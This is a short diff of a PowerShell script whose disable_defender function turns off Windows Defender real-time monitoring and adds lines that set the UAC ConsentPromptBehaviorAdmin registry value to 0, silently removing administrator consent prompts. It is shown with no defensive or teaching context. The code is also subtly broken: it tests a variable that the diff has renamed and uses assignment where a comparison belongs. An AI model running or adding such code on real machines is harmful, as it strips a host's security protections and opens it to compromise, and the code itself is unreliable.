@@ -24,11 +24,14 @@ function main {
 };
 
 function disable_defender {
-    $results = Get-MpPreference | % {$_.Name -eq "DisableRealtimeMonitoring"};
+    $firewall_status = Get-MpPreference | % {$_.Name -eq "DisableRealtimeMonitoring"};
+    $UAC_status = Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin | % {$_.ConsentPromptBehaviorAdmin}
+    
     if ($results = "False") {
         Write-Host "Disabling Windows Defender";
-        
         Set-MpPreference -DisableRealtimeMonitoring $True;
+    } elseif ($UAC_status -ne 0) {
+        Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
     };
 };
 
